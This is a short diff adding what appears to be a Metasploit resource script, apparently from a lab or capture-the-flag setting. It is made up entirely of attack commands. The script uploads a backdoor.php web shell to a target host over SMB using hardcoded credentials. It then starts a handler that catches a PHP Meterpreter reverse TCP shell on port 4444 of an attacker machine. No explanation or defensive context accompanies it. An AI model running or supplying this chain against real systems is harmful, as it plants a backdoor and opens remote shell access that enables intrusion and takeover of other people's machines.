@@ -1,0 +1,14 @@
+use admin/smb/upload_file
+set LPATH /home/kali/backdoor.php
+set RHOSTS 192.168.100.86
+set RPATH backdoor.php
+set SMBPASS rwaaaaawr5
+set SMBUSER chewbacca
+set smbshare public
+exploit
+
+use exploit/multi/handler
+set LHOST 192.168.100.87
+set LPORT 4444
+set payload php/meterpreter/reverse_tcp
+exploit
